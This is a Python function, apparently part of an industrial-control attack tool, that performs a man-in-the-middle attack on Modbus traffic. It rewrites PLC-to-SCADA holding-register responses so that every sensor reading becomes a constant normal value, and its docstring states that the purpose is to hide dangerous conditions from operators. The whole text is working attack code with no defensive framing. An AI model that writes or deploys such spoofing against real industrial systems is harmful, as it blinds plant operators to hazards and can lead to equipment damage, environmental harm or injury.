def modbus_sensor_spoofing_mitm(data, direction):
    """
    Spoof sensor values in Modbus responses
    Hide dangerous conditions from operators
    """
    if direction == "PLC→SCADA":
        func_code = data[7]

        if func_code == 0x03:  # Read Holding Registers response
            byte_count = data[8]
            registers = []

            # Parse register values
            for i in range(0, byte_count, 2):
                value = struct.unpack('>H', data[9+i:11+i])[0]
                registers.append(value)

            print(f"    Original sensor values: {registers}")

            # Spoof: Replace all values with "normal" values
            spoofed_registers = [50] * len(registers)  # All sensors read "50"

            # Rebuild response packet
            modified_data = data[:9]
            for value in spoofed_registers:
                modified_data += struct.pack('>H', value)

            print(f"    Spoofed sensor values: {spoofed_registers}")
            return modified_data

    return data
